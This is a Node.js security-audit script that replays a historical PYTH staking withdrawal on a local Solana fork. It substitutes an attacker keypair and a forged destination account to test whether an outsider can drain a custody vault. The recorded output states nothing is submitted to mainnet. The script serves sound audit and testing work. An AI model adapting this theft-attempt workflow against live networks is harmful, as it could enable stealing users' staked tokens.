#!/usr/bin/env node
// Current-binary, signed outsider attempt against the largest PYTH staking custody row.
// Reads mainnet history/state and simulates only on an isolated Surfpool fork.
const fs = require('fs');
const crypto = require('crypto');
const modules = '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/';
const {PublicKey, Keypair, TransactionInstruction, TransactionMessage, SystemProgram} = require(modules + '@solana/web3.js');
const {getAssociatedTokenAddressSync} = require(modules + '@solana/spl-token');
const bs58Module = require(modules + 'bs58');
const bs58 = bs58Module.default || bs58Module;
const {encodeV1} = require('./klend-v1-composition.js');
const fork = 'http://127.0.0.1:9397';
const program = new PublicKey('pytS9TjG1qyAZypk7n8rw8gfW9sUaqqYyMhJQ4E7JCQ');
const signature = '5aMZDthB8GvSPBcCBY8TqawSDiRXGdxxTjSmZTpnijSBk69o8vvJzb7gCUhBuV8zz1JnYcQNGa4Dwzc5ZGKEVhYo';
const env = Object.fromEntries(fs.readFileSync('/tmp/composer-helius-only.env', 'utf8')
  .split('\n').filter(x => x.includes('=')).map(x => x.split(/=(.*)/s).slice(0, 2)));
const source = env.HEAVY_RPC_URL || env.RPC_URL;
let requestId = 0;
async function rpc(url, method, params) {
  const response = await fetch(url, {method:'POST', headers:{'content-type':'application/json'},
    body:JSON.stringify({jsonrpc:'2.0', id:++requestId, method, params})});
  const body = await response.json();
  if (body.error) throw Error(`${method}: ${JSON.stringify(body.error)}`);
  return body.result;
}
const P = x => x instanceof PublicKey ? x : new PublicKey(x);
function fromHistory(tx, index) {
  const msg = tx.transaction.message;
  const loaded = tx.meta.loadedAddresses || {writable:[], readonly:[]};
  const all = [...msg.accountKeys, ...loaded.writable, ...loaded.readonly];
  const h = msg.header, n = msg.accountKeys.length, raw = msg.instructions[index];
  const writable = i => i < n ? (i < h.numRequiredSignatures ?
    i < h.numRequiredSignatures-h.numReadonlySignedAccounts :
    i < n-h.numReadonlyUnsignedAccounts) : i < n+loaded.writable.length;
  return new TransactionInstruction({programId:P(all[raw.programIdIndex]),
    keys:raw.accounts.map(i => ({pubkey:P(all[i]),isSigner:i<h.numRequiredSignatures,
      isWritable:writable(i)})), data:Buffer.from(bs58.decode(raw.data))});
}
function signV1(instructions, attacker, blockhash) {
  const encoded = encodeV1(instructions, attacker.publicKey, blockhash);
  if (encoded.requiredSignatures !== 1) throw Error(`Unexpected signatures: ${encoded.requiredSignatures}`);
  const compiled = new TransactionMessage({payerKey:attacker.publicKey,
    recentBlockhash:blockhash,instructions}).compileToV0Message();
  if (!compiled.staticAccountKeys[0].equals(attacker.publicKey)) throw Error('Signer ordering');
  const wire = Buffer.from(encoded.wire);
  const key = crypto.createPrivateKey({key:Buffer.concat([
    Buffer.from('302e020100300506032b657004220420','hex'),
    Buffer.from(attacker.secretKey.subarray(0,32))]),format:'der',type:'pkcs8'});
  crypto.sign(null,wire.subarray(0,wire.length-64),key).copy(wire,wire.length-64);
  return {wire, encoded};
}
async function main() {
  const tx = await rpc(source,'getTransaction',[signature,{encoding:'json',maxSupportedTransactionVersion:0}]);
  if (!tx || tx.meta.err) throw Error('Historical current-binary control unavailable');
  const ix = fromHistory(tx,0);
  if (!ix.programId.equals(program) || ix.keys.length !== 8) throw Error('Historical WithdrawStake layout changed');
  const attacker = Keypair.generate();
  const vault = ix.keys[4].pubkey.toBase58();
  const sourceInfo = (await rpc(fork,'getAccountInfo',[vault,{encoding:'base64'}])).value;
  const mint = new PublicKey(Buffer.from(sourceInfo.data[0],'base64').subarray(0,32));
  const dest = getAssociatedTokenAddressSync(mint,attacker.publicKey);
  const destData = Buffer.from(sourceInfo.data[0],'base64');
  if (!destData.subarray(0,32).equals(mint.toBuffer())) throw Error('Vault mint mismatch');
  attacker.publicKey.toBuffer().copy(destData,32);
  destData.writeBigUInt64LE(0n,64);
  await rpc(fork,'surfnet_setAccount',[attacker.publicKey.toBase58(),{
    data:'',executable:false,lamports:1000000000,owner:SystemProgram.programId.toBase58(),rentEpoch:0}]);
  await rpc(fork,'surfnet_setAccount',[dest.toBase58(),{
    data:destData.toString('hex'),executable:false,lamports:sourceInfo.lamports,
    owner:sourceInfo.owner,rentEpoch:0}]);
  ix.keys[0].pubkey = attacker.publicKey;
  ix.keys[1].pubkey = dest;
  const accounts = [...new Set(ix.keys.map(k => k.pubkey.toBase58()))]
    .filter(k => k !== attacker.publicKey.toBase58() && k !== dest.toBase58());
  await rpc(fork,'getMultipleAccounts',[accounts,{encoding:'base64'}]);
  const before = await rpc(fork,'getMultipleAccounts',[[vault,dest.toBase58()],{encoding:'base64'}]);
  const blockhash = (await rpc(fork,'getLatestBlockhash',[{commitment:'processed'}])).value.blockhash;
  const {wire,encoded} = signV1([ix],attacker,blockhash);
  const result = await rpc(fork,'simulateTransaction',[wire.toString('base64'),{
    encoding:'base64',sigVerify:true,replaceRecentBlockhash:false,commitment:'processed',
    accounts:{encoding:'base64',addresses:[vault,dest.toBase58()]}}]);
  const amount = x => x?.data ? Buffer.from(x.data[0],'base64').readBigUInt64LE(64).toString() : null;
  const output = {generatedAt:new Date().toISOString(),scope:'signed current-binary local-fork outsider attempt only',
    mainnetSubmission:false,forkSubmission:false,sourceSignature:signature,sourceSlot:tx.slot,
    targetProgram:program.toBase58(),attacker:attacker.publicKey.toBase58(),
    targetVault:vault,attackerDestination:dest.toBase58(),mint:mint.toBase58(),
    wireBytes:encoded.sizeBytes,addresses:encoded.addressCount,requiredSignatures:encoded.requiredSignatures,
    signatureVerified:true,error:result.value.err,computeUnits:result.value.unitsConsumed,
    vaultBeforeRaw:amount(before.value[0]),attackerBeforeRaw:amount(before.value[1]),
    vaultAfterRaw:amount(result.value.accounts?.[0]),attackerAfterRaw:amount(result.value.accounts?.[1]),
    logs:result.value.logs};
  fs.writeFileSync(__dirname+'/pyth-staking-outsider-signed-fork.json',JSON.stringify(output,null,2));
  console.log(JSON.stringify({error:output.error,wireBytes:output.wireBytes,
    addresses:output.addresses,lastLogs:output.logs?.slice(-8)}));
}
main().catch(e => {console.error(e.stack);process.exitCode=1});
